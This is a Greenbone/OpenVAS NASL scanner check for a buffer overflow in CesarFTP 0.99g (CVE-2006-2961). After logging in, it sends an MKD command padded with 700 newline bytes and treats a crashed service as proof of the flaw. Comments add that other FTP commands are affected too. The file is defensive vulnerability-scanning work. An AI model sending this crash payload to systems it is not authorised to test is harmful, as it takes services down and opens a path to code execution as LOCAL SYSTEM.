# SPDX-FileCopyrightText: 2008 Ferdy Riphagen
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.200058");
  script_version("2023-12-20T05:05:58+0000");
  script_tag(name:"last_modification", value:"2023-12-20 05:05:58 +0000 (Wed, 20 Dec 2023)");
  script_tag(name:"creation_date", value:"2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2006-2961");
  script_xref(name:"OSVDB", value:"26364");
  script_name("CesarFTP MKD Command Buffer Overflow DoS Vulnerability");
  script_category(ACT_DENIAL);
  script_family("Denial of Service");
  script_copyright("Copyright (C) 2008 Ferdy Riphagen");
  script_dependencies("ftpserver_detect_type_nd_version.nasl", "logins.nasl");
  script_require_ports("Services/ftp", 21);

  script_xref(name:"URL", value:"http://secunia.com/advisories/20574/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/18586");
  script_xref(name:"URL", value:"http://www.securiteam.com/exploits/5AP0B2AIUY.html");

  script_tag(name:"summary", value:"The remote system is running CesarFTP server, which is
  vulnerable to a buffer overflow attack when using some ftp command
  followed with a long string of arguments.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_tag(name:"affected", value:"CesarFTP Server version <= 0.99g are known to be affected.");

  script_tag(name:"impact", value:"The system could crash, and accepts/execute arbitrary commands
  after the initial overflow attack.");

  script_tag(name:"insight", value:"Note that the service runs with LOCAL SYSTEM privileges on the
  remote host, which means that an attacker can possible gain complete control
  over the system.

  To use the flaw an attacker needs access to the requested FTP server,
  by using a valid account/password or if activated the anonymous account.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = ftp_get_port( default:21 );

soc = open_sock_tcp( port );
if( soc ) {

  # Use the 'HELP' command for version info
  ftp_send_cmd( socket:soc, cmd:"HELP" );
  banner = recv( socket:soc, length:1024 );

  if( ! banner || ( "CesarFTP server" >!< banner ) ) exit( 0 );

  kb_creds = ftp_get_kb_creds();
  user = kb_creds["login"];
  pass = kb_creds["pass"];

  if( ! ftp_authenticate( socket:soc, user:user, pass:pass ) ) exit( 0 );

  # Note:
  # The original advisory is made for the MKD command. But at least
  # the APPE, DELE, RMD, LIST, CWD, RETR commands are also vulnerable
  # to the same stack overflow.

  ftpcmd = "MKD";
  buff = string( ftpcmd, raw_string( 0x20 ), crap( data:raw_string( 0x0A ), length:700 ), "\r\n" );
  send( socket:soc, data:buff );

  recv = recv( socket:soc, length:1024 );
  close( soc );

  soc = open_sock_tcp( port );
  if( soc ) {
    line = ftp_recv_line( socket:soc, retry:2 );
  }
  if( ! soc || ( ! strlen( line ) ) ) {
    security_message( port:port );
    exit( 0 );
  }

  if( soc ) ftp_close( socket:soc );
  exit( 99 );
}

exit( 0 );
